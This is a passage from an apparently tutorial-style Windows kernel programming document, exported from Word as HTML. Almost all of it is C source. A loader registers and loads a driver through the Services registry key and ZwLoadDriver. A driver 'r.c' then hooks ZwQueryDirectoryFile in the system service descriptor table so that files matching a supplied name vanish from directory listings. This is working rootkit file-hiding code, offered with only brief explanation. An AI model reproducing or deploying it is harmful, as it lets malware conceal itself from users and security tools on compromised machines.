<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( argc != 3)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>CopyFile(DIRECTORY&quot;\\&quot;DRV_FILENAME,&quot;C:\\winnt\\system32\\drivers\\&quot;DRV_FILENAME,1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegCreateKey(HKEY_LOCAL_MACHINE,&quot;System\\CurrentControlSet\\Services\\&quot;DRV_NAME,&amp;hkey);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,
&quot;Type&quot;, 0, REG_DWORD, (PBYTE)&amp;val, sizeof(val));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,
&quot;ErrorControl&quot;, 0, REG_DWORD, (PBYTE)&amp;val, sizeof(val));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= 3;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,
&quot;Start&quot;, 0, REG_DWORD, (PBYTE)&amp;val, sizeof(val));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,&quot;ImagePath&quot;,0,REG_EXPAND_SZ,(PBYTE)imgName,strlen(imgName));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlInitAnsiString(&amp;aStr,&quot;\\Registry\\Machine\\System\\CurrentControlSet\\Services\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlAnsiStringToUnicodeString(&amp;uStr,
&amp;aStr, TRUE);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= _ZwLoadDriver(&amp;uStr);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>hDevice
= CreateFile(&quot;\\\\.\\&quot;DRV_NAME, GENERIC_WRITE | GENERIC_READ,
FILE_SHARE_READ | FILE_SHARE_WRITE,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
NULL);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>printf(&quot;Val=%d
hDevice=%x&quot;,val,hDevice);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DeviceIoControl(hDevice,
2 &lt;&lt; 3 , argv[2], strlen(argv[2]), 0, 0, &amp;b, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( strcmp(argv[1],&quot;-u&quot;) == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlInitAnsiString(&amp;aStr,&quot;\\Registry\\Machine\\System\\CurrentControlSet\\Services\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlAnsiStringToUnicodeString(&amp;uStr,
&amp;aStr, TRUE);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_ZwUnloadDriver(&amp;uStr);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DeleteFile(&quot;C:\\winnt\\system32\\drivers\\&quot;DRV_FILENAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegDeleteKey(HKEY_LOCAL_MACHINE,
&quot;System\\CurrentControlSet\\Services\\&quot;DRV_NAME&quot;\\Enum&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegDeleteKey(HKEY_LOCAL_MACHINE,
&quot;System\\CurrentControlSet\\Services\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
the above loader program we do not make many changes and we simply pass the
filename as the third argument. We add a error check to make sure that with the
–I option the user passes a third argument. We also print out the return values
of the ZwLoadDriver and<span style="mso-spacerun: yes">  </span>the CreateFile
function to make sure that there are no errors.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P64<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;string.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
inputBufferLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING
gDeviceName,gSymbolicLinkName,uStr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PDEVICE_OBJECT
gpDeviceObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
DRV_NAME L&quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
filename[100];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
struct <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
NextEntryOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
FileIndex;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
CreationTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
LastAccessTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
LastWriteTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
ChangeTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
EndOfFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
AllocationSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
FileAttributes;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
FileNameLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
EaSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>CCHAR
ShortNameLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>WCHAR
ShortName[12];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>WCHAR
FileName[1];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}FILE_BOTH_DIR_INFORMATION;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
struct <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
int *ServiceTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
int *ServiceCounterTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
int NumberOfServices;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
char *ParamTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
sdt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
short uFileName[128];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllimport)
sdt KeServiceDescriptorTable;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI
NTSTATUS NTAPI ZwQueryDirectoryFile(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE
IoApcRoutine,PVOID IoApcContext,PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
NTSTATUS (*qtype)(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE IoApcRoutine,<span
style="mso-spacerun: yes">   </span>PVOID IoApcContext,<span
style="mso-spacerun: yes">     </span>PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>qtype
OldZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
NewZwQueryDirectoryFile(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE
IoApcRoutine,PVOID IoApcContext,PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
rc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc=OldZwQueryDirectoryFile(hFile,hEvent,IoApcRoutine,IoApcContext,pIoStatusBlock,FileInformationBuffer,FileInformationBufferLength,FileInfoClass,bReturnOnlyOneEntry,PathMask,bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;FileInfoClass=%d
rc=%d\n&quot;,FileInfoClass,rc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(
rc == 0 &amp;&amp; FileInfoClass == 3)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>FILE_BOTH_DIR_INFORMATION
*p,*prev;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
last = 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= prev = (FILE_BOTH_DIR_INFORMATION *)FileInformationBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while(!last)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( p-&gt;NextEntryOffset == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>last
= 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>wcsncpy(uFileName,p-&gt;FileName,p-&gt;FileNameLength/2);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>uFileName[p-&gt;FileNameLength/2]
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;%S
Delta=%d&quot;,uFileName,p-&gt;NextEntryOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(wcsncmp(p-&gt;FileName, uStr.Buffer ,inputBufferLength)<span
style="mso-spacerun: yes">  </span>== 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Match
Found prev=%d p=%d last=%d&quot;,prev-&gt;NextEntryOffset,p-&gt;NextEntryOffset,last);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( p-&gt;NextEntryOffset == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryOffset
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>else<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryOffset
= prev-&gt;NextEntryOffset + p-&gt;NextEntryOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev
= p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (FILE_BOTH_DIR_INFORMATION *)((char *)p + (int)p-&gt;NextEntryOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(rc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
no;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher (PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PIO_STACK_LOCATION
irpStack;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;DriverDispatcher&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>irpStack
= IoGetCurrentIrpStackLocation (Irp);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;DriverDispatcher&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(irpStack-&gt;MajorFunction == IRP_MJ_CREATE)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(irpStack-&gt;MajorFunction == IRP_MJ_DEVICE_CONTROL)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
*inputBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ANSI_STRING
aStr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>inputBuffer
= Irp-&gt;AssociatedIrp.SystemBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>inputBufferLength
= irpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>strncpy(filename,inputBuffer,
inputBufferLength);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>filename[inputBufferLength]=0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlInitAnsiString(&amp;aStr,filename);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlAnsiStringToUnicodeString(&amp;uStr,
&amp;aStr, TRUE);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;%s
inputBufferLength=%d %s %S&quot;,filename,inputBufferLength,aStr.Buffer,uStr.Buffer);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Irp-&gt;IoStatus.Status
= STATUS_SUCCESS;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
